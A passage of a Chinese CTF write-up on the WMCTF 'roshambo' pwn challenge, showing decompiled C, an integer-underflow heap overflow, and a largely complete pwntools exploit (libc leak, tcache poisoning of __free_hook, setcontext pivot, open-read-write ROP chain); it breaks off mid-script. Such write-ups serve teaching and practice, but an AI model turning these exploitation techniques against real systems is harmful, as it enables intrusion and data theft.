class="line">+--------+--------+----------+--------+----------+</span><br><span class="line"></span><br><span class="line">status： &quot;[RPC]&quot;  or  &quot;EXIT&quot;</span><br><span class="line">option:  [1 - 8]</span><br></pre></td></tr></table></figure><p>只有在<code>status</code>为”[RPC]”，另一个client才会做出相应的动作，而至于<code>name_Len</code>开始的位置，后续基本没有用到，可以不用管；对于<code>option</code>，关注<code>client</code>函数中的相应逻辑，重点关注<code>case 8</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_2424</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *size_4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  size_4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(size_4, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s &gt;&gt; "</span>, &amp;name_str[<span class="number">32</span> * mode_is_L]);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, size_4, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(size_4, <span class="string">"EXIT"</span>, <span class="number">4u</span>LL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)size_4 + <span class="number">1</span>) != <span class="number">8L</span>L || game_status != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( *((_QWORD *)size_4 + <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( !game_status_remote )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(size_4 + <span class="number">56</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;name_str[<span class="number">32</span> * mode_is_L]);</span><br><span class="line">          *((_QWORD *)size_4 + <span class="number">2</span>) = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;name_str[<span class="number">32</span> * mode_is_L]);</span><br><span class="line">          sha256((__int64)(size_4 + <span class="number">24</span>), (__int64)(size_4 + <span class="number">56</span>), *((_QWORD *)size_4 + <span class="number">2</span>));</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">        print_info((__int64)&amp;name_str[<span class="number">32</span> * mode_is_L], (__int64)(size_4 + <span class="number">56</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( game_status == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Game is starting.."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          game_status = <span class="number">1</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Game start!"</span>);</span><br><span class="line">          game_status_remote = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( game_status_remote != <span class="number">1</span> || game_status != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        prepared[mode_is_L] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt; You choose %s\n"</span>, &amp;aRock[<span class="number">16</span> * prepared[mode_is_L] - <span class="number">16</span>]);</span><br><span class="line">        ++play_times;</span><br><span class="line">        <span class="keyword">if</span> ( prepared[mode_is_L == <span class="number">0</span>] )</span><br><span class="line">          play();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          game_status_remote = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( game_status_remote != <span class="number">1</span> || game_status != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        prepared[mode_is_L] = <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt; You choose %s\n"</span>, &amp;aRock[<span class="number">16</span> * prepared[mode_is_L] - <span class="number">16</span>]);</span><br><span class="line">        ++play_times;</span><br><span class="line">        <span class="keyword">if</span> ( prepared[mode_is_L == <span class="number">0</span>] )</span><br><span class="line">          play();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          game_status_remote = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( game_status_remote != <span class="number">1</span> || game_status != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        prepared[mode_is_L] = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt; You choose %s\n"</span>, &amp;aRock[<span class="number">16</span> * prepared[mode_is_L] - <span class="number">16</span>]);</span><br><span class="line">        ++play_times;</span><br><span class="line">        <span class="keyword">if</span> ( prepared[mode_is_L == <span class="number">0</span>] )</span><br><span class="line">          play();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          game_status_remote = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = get_length((__int64)size_4);</span><br><span class="line">    <span class="built_in">write</span>(file_file[mode_is_L], size_4, v1);</span><br><span class="line">    <span class="built_in">free</span>(size_4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    print_game_result();</span><br><span class="line">    v0 = get_length((__int64)size_4);</span><br><span class="line">    <span class="built_in">write</span>(file_file[mode_is_L], size_4, v0);</span><br><span class="line">    <span class="built_in">free</span>(size_4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">    <span class="built_in">size</span> = read_n();</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Too big!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"what do you want to say? "</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, ptr, <span class="built_in">size</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leave: %s"</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>case 8</code>就是结束游戏，然后留言的功能，进入这个case的前提是游戏已经开始过。</p></li><li><p>同时还要注意的是，存在一个sandbox，禁用了<code>execve</code>，那么只能orw了：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803113637039.png" alt="image-20200803113637039"></p></li><li><p>理清逻辑之后，可以开始利用了。关键在于这个<code>case 8</code>，接受size的时候，只检查<code>size &gt; 0x100</code>，而当<code>size = 0</code>的时候，<code>malloc</code>会分配0x20 bytes，而注意到<code>read(0, ptr, size - 1);</code>，size - 1造成负整数溢出，从而这里存在一个堆溢出。</p></li><li><p>知道这一点之后就很简单了，利用heap overflow伪造unsorted bin，利用unsorted bin来leak libc；再tcache poisoning，分配<code>__free_hook</code>就能改了；之后就是常规套路，改<code>__free_hook</code>为<code>setcontext + 53</code>的同时，布置好rop即可；最后触发free的时候就读到flag了：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803113939691.png" alt="image-20200803113939691"></p></li><li><p>不过从这个flag来看，最后感觉是不是非预期了啊，确实很多东西都没用到。不过还有一个存在漏洞的点，就是<code>recv_client</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">sub_15CE</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( *(_QWORD *)(a1 + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_hash(a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[Enter Game] Player Name: %s \n\n"</span>, a1 + <span class="number">56</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)], (<span class="keyword">const</span> <span class="keyword">char</span> *)(a1 + <span class="number">56</span>), <span class="number">0x20</span>uLL);</span><br><span class="line">        add_player_info();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2L</span>L:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_hash(a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[Enter Game] Player Name: %s \n\n"</span>, a1 + <span class="number">56</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)], (<span class="keyword">const</span> <span class="keyword">char</span> *)(a1 + <span class="number">56</span>), <span class="number">0x20</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">16</span>) &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr = <span class="built_in">malloc</span>(*(_QWORD *)(a1 + <span class="number">16</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(ptr, (<span class="keyword">const</span> <span class="keyword">void</span> *)(a1 + <span class="number">56</span>), *(_QWORD *)(a1 + <span class="number">16</span>));</span><br><span class="line">        print_info((__int64)&amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)], (__int64)ptr);</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Game start!"</span>);</span><br><span class="line">      game_status = <span class="number">1</span>;</span><br><span class="line">      game_status_remote = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[%s]: I'm prepared\n"</span>, &amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)]);</span><br><span class="line">      prepared[mode_is_L == <span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( prepared[mode_is_L] )</span><br><span class="line">        play();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6L</span>L:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[%s]: I'm prepared\n"</span>, &amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)]);</span><br><span class="line">      prepared[mode_is_L == <span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( prepared[mode_is_L] )</span><br><span class="line">        play();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7L</span>L:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[%s]: I'm prepared\n"</span>, &amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)]);</span><br><span class="line">      prepared[mode_is_L == <span class="number">0</span>] = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( prepared[mode_is_L] )</span><br><span class="line">        play();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8L</span>L:</span><br><span class="line">      print_game_result();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">      <span class="built_in">size</span> = read_n();                          <span class="comment">// integer overflow =============================================</span></span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Too big!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"what do you want to say? "</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, ptr, <span class="built_in">size</span> - <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"leave: %s"</span>, ptr);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>case 3</code>这里，先是分配了一个chunk给了<code>ptr</code>，这与<code>case 8</code>中的<code>ptr</code>是一致的，同时这里在<code>free</code>之前还<code>sleep(2)</code>，也就是说，在这2s之内，如果另一个线程<code>client</code>也分配了一个chunk写入<code>ptr</code>，那么这里就有一个tcache double free。（这里没有验证过，有兴趣的可以自行尝试）</p></li><li><p>exp</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''pwn_roshambo_C.py'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'81.68.174.63'</span>, <span class="number">64681</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ec0d0</span></span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">setcontext_offset = libc.sym[<span class="string">'setcontext'</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(auth, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your Mode: '</span>, <span class="string">'C'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Authorization: "</span>, auth)</span><br><span class="line">    p.sendlineafter(<span class="string">"Your Name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(status, case, name_len=<span class="number">0</span>, hash_data=<span class="string">""</span>, name=<span class="string">""</span>, token=<span class="string">" &gt;&gt; "</span>)</span>:</span></span><br><span class="line">    payload = status.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>) + p64(case)</span><br><span class="line">    <span class="keyword">if</span> name_len != <span class="number">0</span>:</span><br><span class="line">        payload += p64(name_len) + hash_data + name</span><br><span class="line">    p.sendlineafter(token, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"what do you want to say? "</span>, content)</span><br><span class="line"></span><br><span class="line">start(<span class="string">'123'</span>, <span class="string">'123'</span>)</span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x18</span>, <span class="string">'test'</span>)</span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0xF8</span>, <span class="string">'test'</span>)</span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x28</span>, <span class="string">'test'</span>)</span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x0</span>, <span class="string">"A"</span> * <span class="number">0x118</span> + p64(<span class="number">0x501</span>))   <span class="comment"># unsorted bin</span></span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, <span class="number">0x700</span>, <span class="string">''</span>, (p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)) * <span class="number">0x65</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x28</span>, <span class="string">"AAAA"</span>)  <span class="comment"># free unsorted bin</span></span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x0</span>, <span class="string">"A"</span> * <span class="number">0x117</span> + <span class="string">"libcaddr"</span>)   <span class="comment"># leak</span></span><br><span class="line">p.recvuntil(<span class="string">"libcaddr\n"</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_setcontext = libc_base + setcontext_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcahe poisoning</span></span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0xF1</span>) + p64(__free_hook))   </span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0xF8</span>, <span class="string">"AAAA"</span>)   </span><br><span class="line"></span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002155f</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000023e6a</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b96</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">libc_open = libc_base + libc.sym[<span class="string">'open'</span>]</span><br><span class="line">libc_read = libc_base + libc.sym[<span class="string">'read'</span>]</span><br><span class="line">libc_write = libc_base + libc.sym[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(libc_setcontext + <span class="number">53</span>)</span><br><span class="line">payload += flat([__free_hook + <span class="number">0xB0</span>, pop_rsi, <span class="number">0</span>, libc_open]) <span class="comment"># 0x20</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">5</span>, pop_rsi, __free_hook + <span class="number">0xC0</span>, pop_rdx, <span class="number">0x30</span>, libc_read]) <span class="comment"># 0x38</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">1</span>, pop_rsi, __free_hook + <span class="number">0xC0</span>, pop_rdx, <span class="number">0x30</span>, libc_write]) <span class="comment"># 0x38</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += flat([__free_hook + <span class="number">8</span>, pop_rdi])</span><br><span class="line">payload += <span class="string">'flag\x00'</span></span><br><span class="line"></span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0xF8</span>, payload)  </span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''pwn_roshambo_L.py'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'81.68.174.63'</span>, <span class="number">64681</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(room, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your Mode: '</span>, <span class="string">'L'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Your room: "</span>, room)</span><br><span class="line">    p.sendlineafter(<span class="string">"Your Name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(status, case, name_len=<span class="number">0</span>, hash_data=<span class="string">""</span>, name=<span class="string">""</span>)</span>:</span></span><br><span class="line">    payload = status.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>) + p64(case)</span><br><span class="line">    <span class="keyword">if</span> name_len != <span class="number">0</span>:</span><br><span class="line">        payload += p64(name_len) + hash_data + name</span><br><span class="line">    p.sendlineafter(<span class="string">" &gt;&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"what do you want to say? "</span>, content)</span><br><span 